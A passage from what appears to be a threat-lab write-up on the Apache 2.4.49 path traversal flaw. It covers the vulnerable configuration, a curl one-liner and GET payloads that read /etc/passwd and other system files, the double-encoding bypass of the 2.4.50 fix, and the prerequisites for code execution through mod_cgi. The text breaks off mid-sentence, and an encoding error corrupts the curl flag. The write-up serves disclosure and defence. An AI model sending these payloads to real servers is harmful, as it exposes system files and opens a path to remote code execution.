
Older versions are unaffected by this vulnerability.
Exploitation Juniper Threat Labs, set up Apache http server 2.4.49 to simulate the attack scenario.
Below is the vulnerable configuration:
Vulnerable: <Directory />
Require all granted </Directory>
NOT vulnerable (** DEFAULT **) : <Directory />
Require all denied </Directory>
Vulnerable config in httpd.conf We can check the directory traversal with this one-liner curl command: curl -v â€“path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Contents of /etc/passwd retrieved Payloads can be modified to view other files also.
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/os-release This issue was fixed in Apache http server version 2.4.50 but was again exploited using double encoding technique.
Contents of /etc/passwd retrieved via double encoding Path Traversal to Remote Code Execution (RCE)
A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution.
To achieve RCE, there are some pre-requisites.
RCE is possible on the server only if mod_cgi is enabled.
Mod_cgi is disabled in the default Apache http server configuration.
Target binary should have executable permissions for /bin/